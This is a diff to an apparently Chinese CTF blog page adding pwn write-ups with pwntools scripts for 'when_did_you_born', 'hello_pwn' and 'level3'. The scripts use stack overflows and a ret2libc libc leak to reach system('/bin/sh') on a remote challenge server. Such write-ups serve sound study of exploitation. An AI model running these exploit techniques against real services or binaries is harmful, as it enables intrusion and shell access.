@@ -131,7 +131,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    1.2k 字
+                    1.5k 字
                   </span>&nbsp;
                 
 
@@ -139,7 +139,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      6 分钟
+                      8 分钟
                   </span>&nbsp;
                 
 
@@ -417,6 +417,49 @@ io.recvuntil(&#39;hello,you can leave some message here:&#39;)
 payload=&#39;a&#39;*0x26+p32(0)+p32(sys_addr)+p32(0)+p32(sh_addr)
 io.sendline(payload)
 io.interactive()</code></pre>
+<h4 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h4><p>简单的栈溢出，经典题目，有膜法</p>
+<pre><code class="python">from pwn import *
+
+# io=process(&#39;./when_did_you_born&#39;)
+io=remote(&#39;111.198.29.45&#39;,47087)
+io.sendlineafter(&#39;What\&#39;s Your Birth?&#39;,&#39;1000&#39;)
+io.recvuntil(&quot;What&#39;s Your Name?&quot;)
+payload=&#39;a&#39;*(0x20-0x18)+p64(1926)
+io.sendline(payload)
+io.interactive()</code></pre>
+<h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>比上一题更简单的溢出（半斤八两）</p>
+<pre><code class="python">from pwn import *
+# io=process(&#39;./hello_pwn&#39;)
+io=remote(&#39;111.198.29.45&#39;,42456)
+io.recvuntil(&#39;bof&#39;)
+payload=&#39;a&#39;*4+p64(1853186401)
+io.sendline(payload)
+io.interactive()</code></pre>
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>ret2libc，泄露一个函数地址然后算偏移，控制程序流程再执行一次漏洞函数，拿到shell</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import *
+
+# io=process(&#39;./level3&#39;)
+io=remote(&#39;111.198.29.45&#39;,41019)
+elf=ELF(&#39;./level3&#39;)
+
+write_plt=elf.plt[&#39;write&#39;]
+vuln_addr = elf.symbols[&#39;vulnerable_function&#39;]
+write_got=elf.got[&#39;write&#39;]
+
+payload=&#39;a&#39;*0x88+p32(0)+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)
+io.recvuntil(&#39;Input:\n&#39;)
+io.sendline(payload)
+write_leak=u32(io.recv()[:4])
+libc=LibcSearcher(&#39;write&#39;,write_leak)
+libc_base = write_leak - libc.dump(&#39;write&#39;)
+sys_addr=libc_base+libc.dump(&#39;system&#39;)
+bin_sh_addr=libc_base+libc.dump(&#39;str_bin_sh&#39;)
+io.recv()
+payload=&#39;a&#39;*0x88+p32(0)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)
+io.sendline(payload)
+io.interactive()</code></pre>
+<p>这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因</p>
 
             <hr>
           </div>
